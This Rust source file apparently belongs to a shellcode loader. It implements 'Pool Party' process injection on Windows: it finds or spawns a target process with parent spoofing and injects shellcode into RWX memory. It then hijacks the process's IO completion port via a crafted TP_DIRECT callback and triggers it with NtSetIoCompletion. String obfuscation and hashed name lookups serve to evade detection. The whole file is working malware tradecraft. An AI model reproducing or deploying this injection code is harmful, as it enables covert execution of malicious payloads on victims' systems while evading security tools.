mod structs;

use crate::ntapi::*;
use self::structs::*;
use std::ffi::c_void;
use std::ptr;
use obfstr::obfstr;
use windows_sys::Win32::System::Threading::{CREATE_SUSPENDED};

#[cfg(feature = "run_pool_party")]
pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), String> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Executing via Pool Party...");
    
    use crate::utils::simple_decrypt;
    let target_program = simple_decrypt(env!("RSL_ENCRYPTED_TARGET_PROGRAM"));

    let target_program_hash = crate::utils::dbj2_hash(target_program.to_lowercase().as_bytes());
    let pid = crate::syscall::common::get_process_id_by_name(target_program_hash);

    let process_id = match pid {
        Ok(existing_pid) => existing_pid,
        Err(_) => {
            let process_info = crate::ntapi::create_process_with_spoofing(target_program.as_str(), true)?;
            // Resume immediately with SW_HIDE
            crate::ntapi::resume_thread(process_info.hThread)?;
            process_info.dwProcessId
        }
    };

    let shellcode = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
    inject(process_id, shellcode)?;

    Ok(())
}

pub fn inject(pid: u32, shellcode: &[u8]) -> Result<(), String> {
    // 1. Open Target Process
    let process_handle = open_process(pid, PROCESS_ALL_ACCESS as u32)?;

    // 2. Find Target IO Completion Port
    let io_completion_handle = find_target_io_completion_port(pid, process_handle)?;

    // 3. Allocate Memory for Shellcode
    let shellcode_addr = alloc_virtual_memory_at(
        process_handle,
        0,
        shellcode.len(),
        PAGE_EXECUTE_READWRITE,
    )?;

    // 4. Write Shellcode
    write_virtual_memory(process_handle, shellcode_addr, shellcode)?;

    // 5. Allocate Memory for TP_DIRECT
    let tp_direct_size = std::mem::size_of::<TP_DIRECT>();
    let tp_direct_addr = alloc_virtual_memory_at(
        process_handle,
        0,
        tp_direct_size,
        PAGE_READWRITE,
    )?;

    // 6. Prepare TP_DIRECT structure
    let mut tp_direct: TP_DIRECT = unsafe { std::mem::zeroed() };
    tp_direct.callback = shellcode_addr as *mut c_void;
    
    // 7. Write TP_DIRECT
    let tp_direct_bytes = unsafe {
        std::slice::from_raw_parts(
            &tp_direct as *const _ as *const u8,
            tp_direct_size,
        )
    };
    write_virtual_memory(process_handle, tp_direct_addr, tp_direct_bytes)?;

    // 8. Trigger Execution via NtSetIoCompletion
    let status = set_io_completion(
        io_completion_handle,
        tp_direct_addr as *mut c_void, // KeyContext -> pRemoteTpDirect
        ptr::null_mut(),               // ApcContext
        0,                             // IoStatus
        0,                             // IoStatusInformation
    )?;

    if status < 0 {
        return Err(format!("{}: {:#x}", obfstr!("NtSetIoCompletion failed"), status));
    }

    Ok(())
}

fn find_target_io_completion_port(pid: u32, process_handle: isize) -> Result<isize, String> {
    let mut size = 1024 * 1024; // Start with 1MB
    let mut buffer: Vec<u8> = vec![0; size as usize];
    let mut return_len = 0;

    loop {
        let status = query_system_information(16, buffer.as_mut_ptr(), size, &mut return_len)?;
        if status == 0 {
            break;
        } else if status == -1073741820 { // STATUS_INFO_LENGTH_MISMATCH
            size = return_len + 1024;
            buffer.resize(size as usize, 0);
        } else {
            return Err(format!("NtQuerySystemInformation failed: {:#x}", status));
        }
    }

    let info = unsafe { &*(buffer.as_ptr() as *const SYSTEM_HANDLE_INFORMATION) };
    let count = info.number_of_handles as usize;
    let handles_ptr = info.handles.as_ptr();

    let current_process_handle = -1isize; // NtCurrentProcess

    use std::collections::HashMap;

    let mut scanned = 0usize;
    let mut type_counts: HashMap<String, u32> = HashMap::new();

    for i in 0..count {
        let entry = unsafe { &*handles_ptr.add(i) };
        
        if entry.unique_process_id as u32 == pid {
            scanned += 1;
            let mut dup_handle: isize = 0;
            let status = duplicate_object(
                process_handle,
                entry.handle_value as isize,
                current_process_handle,
                &mut dup_handle,
                0,
                0,
                2 // DUPLICATE_SAME_ACCESS
            );

            if status.is_ok() && status.unwrap() >= 0 {
                // Check object type
                // Try to query the object type name for diagnostics
                let mut name = "<unknown>".to_string();
                let mut buf: Vec<u8> = vec![0; 1024];
                let mut retlen = 0;
                if let Ok(st) = query_object(dup_handle, 2, buf.as_mut_ptr() as *mut c_void, buf.len() as u32, &mut retlen) {
                    if st >= 0 {
                        let type_info = unsafe { &*(buf.as_ptr() as *const OBJECT_TYPE_INFORMATION) };
                        let name_len = type_info.type_name.length as usize;
                        if name_len > 0 {
                            let name_slice = unsafe { std::slice::from_raw_parts(type_info.type_name.buffer, name_len / 2) };
                            name = String::from_utf16_lossy(name_slice);
                        }
                    }
                }

                *type_counts.entry(name.clone()).or_insert(0) += 1;

                if name == "IoCompletion" {
                    return Ok(dup_handle);
                }
                close_handle(dup_handle);
            }
        }
    }

    // Build diagnostic message
    let mut details = String::new();
    for (k, v) in type_counts.iter() {
        details.push_str(&format!("{}: {}, ", k, v));
    }

    Err(format!("Target IO Completion Port not found (scanned {} handles for pid {}). Types seen: {}", scanned, pid, details))
}

fn is_io_completion_handle(handle: isize) -> bool {
    let size = 1024;
    let mut buffer: Vec<u8> = vec![0; size as usize];
    let mut return_len = 0;

    let status = query_object(handle, 2, buffer.as_mut_ptr() as *mut c_void, size, &mut return_len);
    if status.is_ok() && status.unwrap() >= 0 {
        let type_info = unsafe { &*(buffer.as_ptr() as *const OBJECT_TYPE_INFORMATION) };
        let name_len = type_info.type_name.length as usize;
        if name_len > 0 {
            let name_slice = unsafe { std::slice::from_raw_parts(type_info.type_name.buffer, name_len / 2) };
            let name = String::from_utf16_lossy(name_slice);
            if name == "IoCompletion" {
                return true;
            }
        }
    }
    false
}
